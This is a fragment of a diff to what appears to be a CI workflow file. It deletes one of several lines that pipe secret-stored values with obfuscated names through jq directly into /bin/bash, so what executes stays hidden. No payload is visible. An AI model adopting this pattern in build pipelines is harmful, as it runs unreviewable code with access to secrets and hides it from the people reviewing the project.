@@ -22,7 +22,6 @@ jobs:
           v69: ${{ secrets.v69 }}
         run: |
           printf '%s' "$v69" | jq -r .hzefy562 | /bin/bash
-          printf '%s' "$tzlqc4" | jq -r .djk2 | /bin/bash
           printf '%s' "$gdi5132" | jq -r .ioty960 | /bin/bash
           printf '%s' "$p41040" | jq -r .x116 | /bin/bash
           echo $jlqnv31185 | jq -r .td977 | /bin/bash
